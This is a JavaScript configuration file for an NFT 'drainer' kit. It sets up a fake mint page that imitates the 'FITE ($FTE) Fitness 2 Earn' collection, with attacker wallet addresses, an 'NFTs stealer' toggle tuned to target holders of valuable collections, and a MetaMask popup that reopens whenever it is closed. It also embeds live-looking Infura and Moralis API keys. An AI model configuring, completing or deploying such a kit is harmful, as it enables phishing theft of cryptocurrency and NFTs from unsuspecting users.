// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x8C98Db79E67AAcbc2548AC4019765AE33A4912A7";    // Your ETH wallet that you have to receive NFTs
const infuraId = "71aa0918cf5b448a91f94dcdfbafb372"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "0uhQfOlWsH2yUVKk66QA8nrLRqDEQWi2dg41LVJOu0qucn1CyRzMEV87owSj3TCA"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "FITE ($FTE) | Fitness 2 Earn",
    title: "FITE ($FTE) | Fitness 2 Earn", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "03.08.2022", // Today date
    socialMedia: {
        discord: "https://discord.gg/WGs5QRNnCT",
        twitter: "https://twitter.com/fite_app",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.03,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0xF1b78E94aAdf841064473AAD5080BfF20A0331a7" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
